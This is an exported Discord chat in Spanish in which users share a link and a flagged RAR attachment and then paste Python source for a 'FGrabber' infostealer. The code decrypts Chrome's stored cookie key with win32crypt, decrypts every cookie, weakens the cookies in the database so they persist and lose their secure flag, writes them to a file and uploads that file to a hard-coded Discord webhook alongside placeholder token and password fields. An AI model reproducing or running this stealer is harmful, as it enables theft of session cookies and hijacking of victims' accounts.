
#6953
🕵️NoOne

Isa97 — 03/03/2022
https://pruebas.gach64.repl.co/
Isa97 — 03/03/2022
bro
mandame md
si tienes dudas
okey?
˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞ — 03/03/2022
Pues
Tengo millones XD
Ya vas a dormir ?
Me acosté para descansar un poco
Llevo 9 horas programando ahí
Isa97 — 03/03/2022
Jajaja
Estoy fuera
Eacribelas
Después t ayudo
Isa97 — hoy a las 6:19
Hm, it looks like that file might've been a virus. Instead of cooking up trouble, try cooking up a Tagliatelle with Spinach, Mascarpone, and Parmesan: https://www.jamieoliver.com/recipes/pasta-recipes/tagliatelle-with-spinach-mascarpone-and-parmesan/
Hm, it looks like that file might've been a virus. Instead of cooking up trouble, try cooking up a Tagliatelle with Spinach, Mascarpone, and Parmesan: https://www.jamieoliver.com/recipes/pasta-recipes/tagliatelle-with-spinach-mascarpone-and-parmesan/
Tipo de archivo adjunto: archive
Nuevo_Archivo_WinRAR.rar
24 bytes
https://discord.gg/vXXRn5TJ
pip3 install pycryptodome pypiwin32
from discord_webhook import DiscordWebhook, DiscordEmbed

# COOKIES
import os
import json
import base64
Expandir
message.txt
5 KB
a
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
Expandir
message.txt
3 KB
﻿
from discord_webhook import DiscordWebhook, DiscordEmbed

# COOKIES
import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES 
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]

        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

def main():


    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")

 # get the AES key
    key = get_encryption_key()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            decrypted_value = value
        print(f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================
        """)

        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    
    if len(decrypted_value) != 0:
        with open('Cookies.txt', 'w', encoding="utf-8") as file :
                file.write(f'Host: {host_key} | Cookie Name: {name} | Cookie Value: {decrypted_value}\n')

    db.commit()
    db.close()

if __name__ == "__main__":
    main()





# WEBHOOK
webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/949941931025240094/MR38B_hRcL9nsLIWoneih6tmn4EU9edSKSXnT09CSs4SO9EXptgH3Rt1kc4aBpDxRoPO', username="New Webhook Username")

embed = DiscordEmbed(title='FGrabber', description='Your Embed Description', color='03b2f8')
embed.set_author(name='RAFA and TUTO', icon_url='https://cdn.discordapp.com/attachments/949940973557919819/950348148545568778/wp2624191.png')
embed.set_timestamp()
embed.add_embed_field(name='token', value='Lorem ipsum')
embed.add_embed_field(name='username', value='amet consetetur')
embed.add_embed_field(name='password', value='sadipscing elitr')
with open("Cookies.txt", "rb") as f:
    webhook.add_file(file=f.read(), filename='Cookies.txt')

webhook.add_embed(embed)
response = webhook.execute()
